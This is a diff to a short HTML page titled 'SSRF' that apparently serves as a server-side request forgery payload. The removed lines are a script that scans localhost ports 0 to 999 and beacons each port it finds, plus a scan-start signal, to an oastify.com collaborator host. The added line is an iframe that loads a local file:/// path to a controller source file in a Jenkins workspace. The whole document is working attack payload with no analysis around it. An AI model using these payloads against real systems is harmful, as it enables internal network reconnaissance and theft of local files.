@@ -6,19 +6,6 @@
 </head>
 <body>
  <h3>SSRF</h3>
-<!--Scan local port and receive a ping indicating which ones are found-->
-<script>
-const checkPort = (port) => {
-    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
-        let img = document.createElement("img");
-        img.src = `http://d6k47termy7xhhh58alc0vkz0q6iu9iy.oastify.com/ping?port=${port}`;
-    });
-}
-
-for(let i=0; i<1000; i++) {
-    checkPort(i);
-}
-</script>
-<img src="https://d6k47termy7xhhh58alc0vkz0q6iu9iy.oastify.com/startingScan">
+<iframe src="file:///C:/jenkins/workspace/infinity/infinity-common-services/CI/infinity-cim/Infinity.CIM/CMI.Api/Controllers/IntegrationServicesController.cs"></iframe>
  
 </body>
